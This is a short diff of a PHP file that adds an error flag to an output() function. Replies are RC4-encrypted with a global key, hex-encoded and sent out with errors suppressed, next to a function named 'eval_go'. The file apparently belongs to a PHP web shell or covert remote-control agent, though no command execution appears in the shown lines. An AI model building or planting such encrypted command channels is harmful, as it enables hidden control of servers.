@@ -991,13 +991,18 @@ if(!function_exists('eval_go')){
 }
 
 if(!function_exists('output')){
-	function output($str){
+	function output($str, $err=null){
 		$error = @ob_get_contents();
 		@ob_end_clean();
 		header("Content-Type: text/plain; charset=utf-8");
 		header("Cache-Control: no-cache");
 		header("Pragma: no-cache");
-		$str = @date("d M Y H:i:s",time()).'|'.$_SERVER['REMOTE_ADDR'].'|'.from_encode($str);
+		$header = @date("d M Y H:i:s",time()).'|'.$_SERVER['REMOTE_ADDR'];
+        if ($err != null) {
+            $str = $header.'|1|'.from_encode($err);
+        } else {
+            $str = $header.'|0|'.from_encode($str);
+        }
 		echo bin2hex(rc4($GLOBALS['cipher_key'], $str));
 		die();
 	}
